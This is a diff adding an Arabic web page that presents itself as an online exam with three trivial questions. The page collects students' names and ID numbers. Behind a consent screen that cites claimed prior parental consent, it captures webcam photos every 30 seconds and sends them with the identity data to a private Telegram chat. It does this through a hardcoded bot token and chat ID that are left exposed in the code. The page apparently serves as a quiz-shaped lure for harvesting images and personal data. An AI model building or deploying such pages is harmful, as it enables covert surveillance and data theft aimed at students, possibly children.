@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نظام الاختبارات الإلكترونية</title>
+    <style>
+        body {
+            font-family: 'Tajawal', sans-serif;
+            background-color: #f5f7fa;
+            margin: 0;
+            padding: 20px;
+            color: #333;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #2c3e50;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .question {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+            border-left: 4px solid #3498db;
+        }
+        .options {
+            margin-top: 15px;
+        }
+        .option {
+            display: block;
+            margin: 10px 0;
+        }
+        button {
+            background: #3498db;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background 0.3s;
+            display: block;
+            margin: 20px auto;
+        }
+        button:hover {
+            background: #2980b9;
+        }
+        #cameraPreview {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            width: 200px;
+            border: 3px solid #e74c3c;
+            border-radius: 8px;
+            z-index: 1000;
+        }
+        #consentModal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+        }
+        .modal-content {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            max-width: 500px;
+            text-align: center;
+        }
+        .modal-buttons {
+            margin-top: 20px;
+        }
+        .modal-buttons button {
+            margin: 0 10px;
+            display: inline-block;
+        }
+        #timer {
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
+            margin: 15px 0;
+            color: #2c3e50;
+        }
+        .hidden {
+            display: none;
+        }
+        .danger {
+            color: #e74c3c;
+        }
+        #resultAlert {
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+            text-align: center;
+            display: none;
+        }
+        .alert-success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .alert-danger {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- مرحلة تسجيل البيانات -->
+        <div id="studentForm">
+            <h1>نظام الاختبارات الإلكترونية</h1>
+            
+            <div class="form-group">
+                <label for="studentName">الاسم الكامل للطالب</label>
+                <input type="text" id="studentName" placeholder="أدخل اسم الطالب ثلاثي" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="studentId">رقم الهوية/الجامعي</label>
+                <input type="text" id="studentId" placeholder="أدخل رقم الهوية">
+            </div>
+            
+            <button id="startBtn">بدء الاختبار</button>
+        </div>
+
+        <!-- مرحلة الاختبار -->
+        <div id="quizForm" class="hidden">
+            <div id="timer">الوقت المتبقي: 10:00</div>
+            
+            <div class="question">
+                <h3>1. ما هي عاصمة المملكة العربية السعودية؟</h3>
+                <div class="options">
+                    <label class="option">
+                        <input type="radio" name="q1" value="الرياض" required> الرياض
+                    </label>
+                    <label class="option">
+                        <input type="radio" name="q1" value="جدة"> جدة
+                    </label>
+                    <label class="option">
+                        <input type="radio" name="q1" value="مكة"> مكة
+                    </label>
+                </div>
+            </div>
+            
+            <div class="question">
+                <h3>2. ما هي لغة برمجة تستخدم لإنشاء صفحات الويب؟</h3>
+                <div class="options">
+                    <label class="option">
+                        <input type="radio" name="q2" value="HTML" required> HTML
+                    </label>
+                    <label class="option">
+                        <input type="radio" name="q2" value="Python"> Python
+                    </label>
+                    <label class="option">
+                        <input type="radio" name="q2" value="Java"> Java
+                    </label>
+                </div>
+            </div>
+            
+            <div class="question">
+                <h3>3. كم عدد كواكب المجموعة الشمسية؟</h3>
+                <div class="options">
+                    <label class="option">
+                        <input type="radio" name="q3" value="7" required> 7
+                    </label>
+                    <label class="option">
+                        <input type="radio" name="q3" value="8"> 8
+                    </label>
+                    <label class="option">
+                        <input type="radio" name="q3" value="9"> 9
+                    </label>
+                </div>
+            </div>
+            
+            <button id="submitBtn">إنهاء الاختبار</button>
+            <div id="resultAlert"></div>
+        </div>
+        
+        <!-- معاينة الكاميرا -->
+        <video id="cameraPreview" class="hidden" autoplay playsinline></video>
+    </div>
+    
+    <!-- نافذة الموافقة -->
+    <div id="consentModal" class="hidden">
+        <div class="modal-content">
+            <h2 style="color: #2c3e50;">موافقة على شروط الاختبار</h2>
+            <p>لضمان نزاهة الاختبار، يلزم تفعيل كاميرا الجهاز للمراقبة أثناء الاختبار</p>
+            <p>سيتم أخذ لقطات دورية وإرسالها مع نتائج الاختبار إلى المسؤول</p>
+            <p>بموجب موافقة ولي الأمر المقدمة سابقاً</p>
+            
+            <div class="modal-buttons">
+                <button id="agreeBtn" style="background: #27ae60;">أوافق وأبدأ الاختبار</button>
+                <button id="disagreeBtn" style="background: #e74c3c;">لا أوافق</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ============== إعدادات البوت ==============
+        const BOT_TOKEN = '7390077316:AAHNEtFesiXM7h6Wp4BmrAr7DluySaa79t4';
+        const CHAT_ID = '6670082375';
+        
+        // ============== إعدادات الاختبار ==============
+        const CORRECT_ANSWERS = {
+            q1: 'الرياض',
+            q2: 'HTML',
+            q3: '8'
+        };
+        const EXAM_DURATION = 600; // 10 دقائق بالثواني
+        
+        // ============== متغيرات النظام ==============
+        const studentForm = document.getElementById('studentForm');
+        const quizForm = document.getElementById('quizForm');
+        const startBtn = document.getElementById('startBtn');
+        const submitBtn = document.getElementById('submitBtn');
+        const cameraPreview = document.getElementById('cameraPreview');
+        const consentModal = document.getElementById('consentModal');
+        const agreeBtn = document.getElementById('agreeBtn');
+        const disagreeBtn = document.getElementById('disagreeBtn');
+        const timerElement = document.getElementById('timer');
+        const resultAlert = document.getElementById('resultAlert');
+        
+        let cameraStream = null;
+        let timeLeft = EXAM_DURATION;
+        let timerInterval;
+        let screenshotInterval;
+        const screenshots = [];
+        const studentData = {};
+        
+        // ============== أحداث النظام ==============
+        
+        // بدء الاختبار
+        startBtn.addEventListener('click', () => {
+            const name = document.getElementById('studentName').value.trim();
+            const id = document.getElementById('studentId').value.trim();
+            
+            if (!name) {
+                alert('الرجاء إدخال اسم الطالب كاملاً');
+                return;
+            }
+            
+            studentData.name = name;
+            studentData.id = id || 'غير مسجل';
+            studentData.startTime = new Date();
+            
+            // عرض نافذة الموافقة
+            consentModal.classList.remove('hidden');
+        });
+        
+        // الموافقة على الشروط
+        agreeBtn.addEventListener('click', async () => {
+            consentModal.classList.add('hidden');
+            
+            try {
+                // تفعيل الكاميرا
+                cameraStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
+                    audio: false
+                });
+                
+                cameraPreview.srcObject = cameraStream;
+                cameraPreview.classList.remove('hidden');
+                
+                // بدء أخذ اللقطات
+                startScreenshotCapture();
+                
+                // بدء المؤقت
+                startTimer();
+                
+                // عرض نموذج الاختبار
+                studentForm.classList.add('hidden');
+                quizForm.classList.remove('hidden');
+                
+            } catch (error) {
+                alert('تعذر تفعيل الكاميرا. لا يمكن بدء الاختبار بدون الكاميرا');
+                console.error('Camera Error:', error);
+            }
+        });
+        
+        // رفض الشروط
+        disagreeBtn.addEventListener('click', () => {
+            alert('لا يمكنك بدء الاختبار بدون الموافقة على الشروط');
+            consentModal.classList.add('hidden');
+        });
+        
+        // إرسال الاختبار
+        submitBtn.addEventListener('click', submitQuiz);
+        
+        // ============== وظائف النظام ==============
+        
+        // بدء أخذ لقطات الشاشة
+        function startScreenshotCapture() {
+            // لقطة أولى عند البدء
+            takeScreenshot();
+            
+            // لقطات كل 30 ثانية
+            screenshotInterval = setInterval(() => {
+                takeScreenshot();
+            }, 30000);
+        }
+        
+        // التقاط صورة من الكاميرا
+        function takeScreenshot() {
+            if (!cameraStream) return;
+            
+            const canvas = document.createElement('canvas');
+            canvas.width = cameraPreview.videoWidth;
+            canvas.height = cameraPreview.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(cameraPreview, 0, 0, canvas.width, canvas.height);
+            
+            const timestamp = new Date();
+            const screenshot = {
+                time: timestamp.toLocaleTimeString(),
+                date: timestamp.toLocaleDateString(),
+                dataUrl: canvas.toDataURL('image/jpeg', 0.7)
+            };
+            
+            screenshots.push(screenshot);
+            console.log('تم أخذ لقطة:', screenshot.time);
+        }
+        
+        // بدء المؤقت
+        function startTimer() {
+            updateTimerDisplay();
+            
+            timerInterval = setInterval(() => {
+                timeLeft--;
+                updateTimerDisplay();
+                
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    submitQuiz();
+                }
+            }, 1000);
+        }
+        
+        // تحديث عرض المؤقت
+        function updateTimerDisplay() {
+            const minutes = Math.floor(timeLeft / 60).toString().padStart(2, '0');
+            const seconds = (timeLeft % 60).toString().padStart(2, '0');
+            timerElement.textContent = `الوقت المتبقي: ${minutes}:${seconds}`;
+            
+            if (timeLeft < 120) { // أقل من دقيقتين
+                timerElement.classList.add('danger');
+            }
+        }
+        
+        // إرسال الاختبار
+        async function submitQuiz() {
+            // إيقاف المؤقت والكاميرا
+            clearInterval(timerInterval);
+            clearInterval(screenshotInterval);
+            
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+                cameraPreview.classList.add('hidden');
+            }
+            
+            // حساب النتيجة
+            const answers = getStudentAnswers();
+            const score = calculateScore(answers);
+            
+            // إعداد رسالة النتائج
+            const message = createResultMessage(score, answers);
+            
+            // إرسال النتائج عبر Telegram
+            const sentSuccessfully = await sendToTelegram(message);
+            
+            // عرض النتائج للطالب
+            showResultAlert(score, sentSuccessfully);
+            
+            // إعادة تعيين النظام بعد 5 ثواني
+            setTimeout(resetSystem, 5000);
+        }
+        
+        // جمع إجابات الطالب
+        function getStudentAnswers() {
+            const answers = {};
+            
+            document.querySelectorAll('input[type="radio"]:checked').forEach(input => {
+                answers[input.name] = input.value;
+            });
+            
+            return answers;
+        }
+        
+        // حساب النتيجة
+        function calculateScore(answers) {
+            let score = 0;
+            
+            for (const [question, correctAnswer] of Object.entries(CORRECT_ANSWERS)) {
+                if (answers[question] === correctAnswer) {
+                    score++;
+                }
+            }
+            
+            return score;
+        }
+        
+        // إنشاء رسالة النتائج
+        function createResultMessage(score, answers) {
+            const totalQuestions = Object.keys(CORRECT_ANSWERS).length;
+            const percentage = Math.round((score / totalQuestions) * 100);
+            const endTime = new Date();
+            const duration = Math.floor((endTime - studentData.startTime) / 1000);
+            
+            let message = `📝 <b>نتائج الاختبار</b>\n\n`;
+            message += `👤 <b>الطالب:</b> ${studentData.name}\n`;
+            message += `🆔 <b>رقم الهوية:</b> ${studentData.id}\n\n`;
+            message += `⏱ <b>مدة الاختبار:</b> ${Math.floor(duration / 60)}:${(duration % 60).toString().padStart(2, '0')}\n`;
+            message += `📊 <b>الدرجة:</b> ${score}/${totalQuestions} (${percentage}%)\n\n`;
+            message += `<b>تفاصيل الإجابات:</b>\n`;
+            
+            for (const [question, answer] of Object.entries(answers)) {
+                const isCorrect = answer === CORRECT_ANSWERS[question];
+                message += `السؤال ${question.slice(1)}: ${answer} ${isCorrect ? '✅' : '❌'}\n`;
+            }
+            
+            message += `\n🕒 <b>وقت الإرسال:</b> ${endTime.toLocaleString('ar-SA')}`;
+            
+            return message;
+        }
+        
+        // إرسال إلى Telegram
+        async function sendToTelegram(message) {
+            try {
+                // 1. إرسال النتائج النصية
+                const textResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                const textData = await textResponse.json();
+                
+                // 2. إرسال لقطات الشاشة (إذا وجدت)
+                if (screenshots.length > 0) {
+                    // نرسل أول لقطتين كمثال
+                    for (let i = 0; i < Math.min(2, screenshots.length); i++) {
+                        const screenshot = screenshots[i];
+                        const blob = await fetch(screenshot.dataUrl).then(res => res.blob());
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, `screenshot_${i+1}.jpg`);
+                        formData.append('caption', `لقطة من الاختبار - ${screenshot.time}`);
+                        
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    }
+                }
+                
+                return true;
+            } catch (error) {
+                console.error('فشل الإرسال إلى Telegram:', error);
+                return false;
+            }
+        }
+        
+        // عرض نتيجة الإرسال
+        function showResultAlert(score, sentSuccessfully) {
+            const totalQuestions = Object.keys(CORRECT_ANSWERS).length;
+            
+            if (sentSuccessfully) {
+                resultAlert.textContent = `تم إرسال إجاباتك بنجاح! الدرجة: ${score}/${totalQuestions}`;
+                resultAlert.className = 'alert-success';
+            } else {
+                resultAlert.textContent = `تم حفظ إجاباتك محلياً! الدرجة: ${score}/${totalQuestions} (حدث خطأ في الإرسال)`;
+                resultAlert.className = 'alert-danger';
+            }
+            
+            resultAlert.style.display = 'block';
+            submitBtn.disabled = true;
+        }
+        
+        // إعادة تعيين النظام
+        function resetSystem() {
+            // إعادة تعيين النماذج
+            document.getElementById('studentName').value = '';
+            document.getElementById('studentId').value = '';
+            document.querySelectorAll('input[type="radio"]').forEach(input => {
+                input.checked = false;
+            });
+            
+            // إعادة تعيين المتغيرات
+            timeLeft = EXAM_DURATION;
+            screenshots.length = 0;
+            timerElement.classList.remove('danger');
+            
+            // إعادة العرض
+            quizForm.classList.add('hidden');
+            studentForm.classList.remove('hidden');
+            resultAlert.style.display = 'none';
+            submitBtn.disabled = false;
+        }
+    </script>
+</body>
+</html>
